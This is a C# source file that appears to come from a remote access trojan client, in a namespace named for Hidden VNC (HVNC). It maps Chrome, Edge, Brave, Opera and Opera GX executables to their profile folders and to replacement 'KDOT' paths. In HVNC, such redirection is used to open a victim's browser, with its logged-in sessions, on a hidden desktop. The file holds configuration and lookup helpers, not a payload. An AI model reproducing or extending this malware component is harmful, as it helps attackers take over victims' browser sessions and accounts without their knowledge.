using System;
using System.Collections.Generic;
using System.IO;

namespace Pulsar.Client.Helper.HVNC
{
    /// <summary>
    /// Configuration for browser injection including paths and parameters
    /// </summary>
    public class BrowserConfig
    {
        public string ExecutablePath { get; set; }
        public string SearchPattern { get; set; }
        public string ReplacementPath { get; set; }
    }

    /// <summary>
    /// Manages browser configurations for HVNC injection
    /// </summary>
    public static class BrowserConfiguration
    {
        private static readonly Dictionary<string, BrowserConfig> BrowserConfigs = new Dictionary<string, BrowserConfig>(StringComparer.OrdinalIgnoreCase)
        {
            {
                "Chrome", new BrowserConfig
                {
                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES"), "Google\\Chrome\\Application\\chrome.exe"),
                    SearchPattern = "Local\\Google\\Chrome\\User Data",
                    ReplacementPath = "Local\\Google\\Chrome\\KDOT"
                }
            },
            {
                "ChromeX86", new BrowserConfig
                {
                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES(X86)"), "Google\\Chrome\\Application\\chrome.exe"),
                    SearchPattern = "Local\\Google\\Chrome\\User Data",
                    ReplacementPath = "Local\\Google\\Chrome\\KDOT"
                }
            },
            {
                "Edge", new BrowserConfig
                {
                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES(X86)"), "Microsoft\\Edge\\Application\\msedge.exe"),
                    SearchPattern = "Local\\Microsoft\\Edge\\User Data",
                    ReplacementPath = "Local\\Microsoft\\Edge\\KDOT"
                }
            },
            {
                "Brave", new BrowserConfig
                {
                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES"), "BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                    SearchPattern = "Local\\BraveSoftware\\Brave-Browser\\User Data",
                    ReplacementPath = "Local\\BraveSoftware\\Brave-Browser\\KDOT"
                }
            },
            {
                "Opera", new BrowserConfig
                {
                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("LOCALAPPDATA"), "Programs\\Opera\\opera.exe"),
                    SearchPattern = "Roaming\\Opera Software\\Opera Stable",
                    ReplacementPath = "Roaming\\Opera Software\\KDOT"
                }
            },
            {
                "OperaGX", new BrowserConfig
                {
                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("LOCALAPPDATA"), "Programs\\Opera GX\\opera.exe"),
                    SearchPattern = "Roaming\\Opera Software\\Opera GX Stable",
                    ReplacementPath = "Roaming\\Opera Software\\KDOT"
                }
            }
        };

        /// <summary>
        /// Gets the browser configuration for the specified browser type
        /// </summary>
        /// <param name="browserType">Type of browser (Chrome, Edge, Brave, etc.)</param>
        /// <returns>Browser configuration or null if not found</returns>
        public static BrowserConfig GetConfig(string browserType)
        {
            if (string.IsNullOrWhiteSpace(browserType))
                return null;

            if (BrowserConfigs.TryGetValue(browserType, out var config))
            {
                return config;
            }

            return null;
        }

        /// <summary>
        /// Gets the first valid Chrome configuration (checks both64-bit and32-bit)
        /// </summary>
        /// <returns>Valid Chrome configuration or null if Chrome is not installed</returns>
        public static BrowserConfig GetChromeConfig()
        {
            var chromeConfig = GetConfig("Chrome");
            if (chromeConfig != null)
            {
                try
                {
                    if (!string.IsNullOrEmpty(chromeConfig.ExecutablePath) && File.Exists(chromeConfig.ExecutablePath))
                    {
                        return chromeConfig;
                    }
                }
                catch
                {
                    // ignore and continue
                }
            }

            var chromeX86 = GetConfig("ChromeX86");
            if (chromeX86 != null)
            {
                try
                {
                    if (!string.IsNullOrEmpty(chromeX86.ExecutablePath) && File.Exists(chromeX86.ExecutablePath))
                    {
                        return chromeX86;
                    }
                }
                catch
                {
                    // ignore
                }
            }

            return null;
        }

        /// <summary>
        /// Validates if the browser executable exists
        /// </summary>
        /// <param name="config">Browser configuration to validate</param>
        /// <returns>True if executable exists, false otherwise</returns>
        public static bool ValidateConfig(BrowserConfig config)
        {
            if (config == null)
                return false;

            return File.Exists(config.ExecutablePath);
        }
    }
}